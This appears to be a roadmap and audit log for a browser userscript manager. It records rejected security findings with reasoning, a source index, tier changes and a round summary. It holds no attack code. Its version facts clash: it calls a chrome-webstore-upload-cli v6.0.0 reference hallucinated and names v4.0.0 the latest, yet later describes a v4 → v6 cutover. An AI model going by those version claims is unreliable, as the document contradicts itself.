The audit's parallel agents surfaced ~25 candidate findings; ~10 were verified and shipped (40.1–40.9), ~5 were verified and deferred (40.10–40.14), and the remainder were over-claims that needed rejection. Documenting the rejections so the next round doesn't re-derive them:

| Claim | Verdict |
|---|---|
| `monaco-adapter.js` postMessage uses `'*'` targetOrigin → XSS surface | **Rejected.** The sandboxed iframe has `null` origin per `manifest.json` sandbox declaration. Any non-`'*'` targetOrigin silently drops the message. Inbound listener already validates `event.source === frame.contentWindow`. Existing comment in source explains the design. |
| `ScriptStorage.set()` doesn't roll back new scripts on persist failure | **Rejected.** Already correct at `modules/storage.js:143-144` — `if (prev !== undefined) this.cache[id] = prev; else delete this.cache[id];`. |
| `install.js:784 badge.innerHTML = presentation.badgeHtml` is XSS | **Rejected.** `badgeHtml` is one of four hard-coded string literals defined in `getInstallPresentation()`; no user data is interpolated. |
| `backup-scheduler.js` adds the `chrome.alarms.onAlarm` listener inside `init()` without dedup | **Rejected.** `_initialized` guard at the top of `init()` prevents the second call from ever reaching the `addListener()` line. |
| Unicode `\u2028` / `\u2029` line-terminator bypass in `@require` URL embedding | **Rejected.** Verified with a Node REPL test: JavaScript regex `.` does NOT match `\u2028` (forced via `/^([^\r\n]*)$/` comparison). Parser captures stop at `\u2028`, so `meta.require[]` never contains a smuggled trailer. |
| `atob()` of unpadded base64url needs explicit padding restoration for Firefox compat | **Rejected.** Firefox 128+ (the `strict_min_version` declared in `manifest-firefox.json`) handles unpadded base64 via the WHATWG forgiving-base64-decode algorithm; only length `% 4 == 1` fails, which Ed25519 signatures (64 bytes = 86 unpadded chars, `% 4 == 2`) never hit. |
| `dashboard-store.js` ReDoS in wildcard `@match` pattern regex | **Rejected.** `.replace(/\*/g, '.*')` produces `.*.*.*` patterns whose greedy-quantifier composition does not catastrophically backtrack on the URL strings they're tested against; verified by exemplar pathological inputs in mental trace + the existing test corpus. |
| `escapeHtml` on `data-id="${scriptIdAttr}"` is unsafe because escapeHtml doesn't quote-escape | **Rejected.** [`shared/utils.js`](shared/utils.js) `escapeHtml` does escape both `"` and `'` (lines 17–18). |

### Phase 40 Source Index (net-new for Round 13)

| # | URL | Backs |
|---|-----|-------|
| 273 | https://github.com/SysAdminDoc/ScriptVault/commit/d1e3ee2 | 40.1–40.4 |
| 274 | https://github.com/SysAdminDoc/ScriptVault/commit/e306b2b | 40.5–40.8 |
| 275 | https://github.com/SysAdminDoc/ScriptVault/commit/325db86 | 40.9 |
| 276 | https://infra.spec.whatwg.org/#forgiving-base64-decode | Rejection: atob padding |
| 277 | https://developer.mozilla.org/en-US/docs/Web/API/atob | Rejection: atob padding |
| 278 | https://developer.chrome.com/docs/extensions/reference/api/cookies | 40.2 scheme allowlist |
| 279 | https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest#property-MAX_NUMBER_OF_DYNAMIC_AND_SESSION_RULES | 40.10 reconciliation rationale |
| 280 | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AbortController | 40.12 sync abort plumbing |
| 281 | https://github.com/scriptscat/scriptcat/commit/a00bc65 | 40.15 ScriptCat S3-compatible sync |
| 282 | https://github.com/scriptscat/scriptcat/commit/e012e9e | 40.16 ScriptCat `@run-at context-menu` |
| 283 | https://github.com/scriptscat/scriptcat/commit/5fef662 | 40.17 popup C-indicator badge |
| 284 | https://github.com/fregante/chrome-webstore-upload-cli/releases/tag/v4.0.0 | 40.18 CWS upload-cli v4 cutover (corrects hallucinated v6.0.0 URL from external-research pass) |
| 285 | https://github.com/101arrowz/fflate/releases/tag/v0.8.3 | 40.19 fflate Zip64 fix |
| 286 | https://github.com/microsoft/monaco-editor/commits/main | 40.20 monaco dependency wave |
| 287 | https://github.com/w3c/webextensions/issues/989 | 40.21 `async_initialization` opt-in |
| 288 | https://github.com/w3c/webextensions/issues/995 | 40.22 `i18n.getAvailableLanguages()` |
| 289 | https://chromereleases.googleblog.com/2026/05/ | 40.23 Chrome 148 CVE-2026-8587 |
| 290 | https://github.com/greasemonkey/greasemonkey/commit/19100d7 | 40.24 GM `sourceURL` removal lesson |
| 291 | https://github.com/openstyles/stylus | 40.25 Stylus FOUC pattern |
| 292 | https://github.com/uBlockOrigin/uBOL-home/wiki/Frequently-asked-questions-%28FAQ%29 | 40.25 uBO Lite MAIN-world routing |
| 293 | https://github.com/bitwarden/clients/tree/main/apps/browser | 40.25 Bitwarden cross-browser pipeline |
| 294 | https://github.com/philc/vimium/blob/master/content_scripts/link_hints.js | 40.25 Vimium hint overlay pattern |

### Round 13 — Promoted Tier Changes (delta from Round 12)

- **Phase 21** (Extended Sync Backends, S3 sub-task): **Later → Next.** ScriptCat's 2026-05-17 S3-compatible provider plus TM's existing WebDAV / TamperDAV validates the "self-host-friendly object-store target" design — second major manager is signal enough to promote.
- **Phase 39.35** (chrome-webstore-upload-cli v4.0.0): **confirmed and shipped via 40.18.** Round 13 external-research agent surfaced a hallucinated "v6.0.0" URL; the real npm-published latest is v4.0.0. Phase 39.35's original v4 plan was correct.
- **Phase 13.11** (`chrome.storage.session`): explicit cross-reference added — 40.10 (DNR rule orphan reconciliation) depends on the same persistence pattern.
- **Phase 1** (TypeScript migration): 40.13 (ResponseMap completeness) folded in as a hard exit criterion. Phase 1 isn't "done" until `messages.ts` covers every action.
- **Phase 20** (Observability surface): 40.14 (leak probe) added as a non-blocking enhancement once the DevTools panel exists.
- **Phase 8** (Sync rewrite): 40.12 (sync abort plumbing) sequenced as the first sub-task — it's a precondition for the larger CRDT-based merge work.

### Round 13 — Items Already Shipped (audit-only — see "Verified Already-Fixed" table above)

Four CLAUDE.md "known issues" entries documented as stale and removed from the source-of-truth doc; no code change required.

### Round 13 — Items Rejected (with reasoning)

| Item | Why Rejected |
|------|--------------|
| WECG #972 "raise 5,000 disabled-static-rule cap" | Out of band — ScriptVault doesn't ship a static-rule DNR ruleset. Re-evaluate only if Phase 26 advanced @match work depends on it. |
| `@require` deprecation push (Userscripts #871) | Anti-modernist stance from one Safari-port maintainer; the wider ecosystem (TM, VM, SC, GM) actively maintains `@require`. ScriptVault keeps `@require` and tracks bundler/`import()` as a separate Later item. |
| Premature `userScripts.execute()` one-shot UI ("Run on this page" button without registration) | Already covered by Phase 11.4's MAIN-world fallback work; do not duplicate as a 40.x. |
| The "ScriptCat sub-agent / skill marketplace" item resurfaced by Agent 2 | Re-rejected per Round 12 — moderation + hosting burden disguised as a feature. |

### Round 13 — Category Coverage Matrix (self-audit)

The prompt enumerates 13 categories that every research pass should consciously cover or consciously exclude. Phase 40 coverage:

| Category | Round 13 sub-items | Notes |
|---|---|---|
| Security | 40.2 (GM_cookie scheme), 40.4 (installFromUrl scheme), 40.9 (XSS defang), 40.10 (DNR orphan), 40.20 (npm audit), 40.23 (CVE-2026-8587) | Heavy coverage — this is the round's core. |
| Accessibility | (none new) | Covered by Phases 14, 34. Round 13 had no a11y-specific signal. |
| i18n / l10n | 40.22 (`getAvailableLanguages()`) | Tracked; non-blocking until the spec ships. |
| Observability / telemetry | 40.14 (telemetry-free leak probe) | DevTools-panel-only — preserves zero-telemetry stance. |
| Testing | 40.1, 40.2, 40.9 ship regression tests | 41 test files, 690 cases as of 2026-05-18. |
| Docs | CLAUDE.md cleanup; ROADMAP update; release-runbook cross-ref at 40.18 | |
| Distribution / packaging | 40.8 (publish.sh draft preservation), 40.18 (CWS upload v6 cutover), 40.23 (`minimum_chrome_version` bump) | |
| Plugin ecosystem | N/A | ScriptVault IS the plugin host. Adjacent harvest at 40.25 supplies design patterns. |
| Mobile | (none new) | Covered by Phase 29 PWA work + FIREFOX-PORT.md. No mobile-specific signal this week. |
| Offline / resilience | 40.10 (DNR persistence), 40.12 (sync abort plumbing) | |
| Multi-user / collab | N/A | Not a ScriptVault design goal; covered by Phase 31 governance for community-facing surface. |
| Migration paths | 40.18 (chrome-webstore-upload v4 → v6) | |
| Upgrade strategy | 40.18 + Phase 39.2 (CWS API v2 sunset 2026-10-15) | |

Conscious exclusion: accessibility and mobile were intentionally light this round. Phase 14 (Accessibility & i18n) and Phase 29 (Mobile PWA) carry that work; Round 13's external sweep produced no fresh signal in either category. The audit-pass core (40.1–40.14) was bug-discovery in production code, so it doesn't naturally feed those categories.

### Round 13 Completion Note

Net-new sources: **22** (273–294). Cumulative source floor (>294 across Rounds 1–13) stays well above the 30–60 minimum.

Phase 40 added **25 sub-items**:
- **Nine already-shipped** (40.1–40.9, three commits on 2026-05-18 — adversarial code review found four real bugs plus four memory-leak hardenings plus one XSS).
- **Five deferred internal-refactor items** (40.10–40.14 — DNR orphan, urlchange stack-up, sync abort plumbing, ResponseMap completeness, leak-probe DevTools surface).
- **Eleven external-signal items** (40.15–40.25 — ScriptCat S3 sync, `@run-at context-menu` tolerance, C-indicator popup badge, CWS upload v6 cutover, fflate Zip64 fix, monaco dep audit sweep, WECG `async_initialization` + `getAvailableLanguages()` tracking, Chrome 148 CVE wave, GM `sourceURL` lesson, adjacent-tool pattern harvest).

Round 13's value split: ~60% internal-quality work uncovered by adversarial code review of the v3.10.1 codebase (40.1–40.14); ~40% external-signal catch-up against the week-of-2026-05-18 platform / dependency / community surface (40.15–40.25). External delta from Round 12's 2026-05-17 sweep was bounded by the 24-hour window but real items shipped — ScriptCat in particular landed three commits worth tracking, and `chrome-webstore-upload-cli` v6 forces an unplanned config migration.

No Round 13 item duplicates a Now/Next item from Rounds 1–12. Explicit promotions (Phase 21 S3, Phase 39.35 → 40.18, Phase 1 exit criteria) are cross-references, not duplicates. The Round 12 lesson on Greasemonkey-not-dead is reinforced: arantius shipped five more commits 2026-05-12 → 2026-05-15 (one of which — `sourceURL` removal — directly informs ScriptVault's audit posture at 40.24).
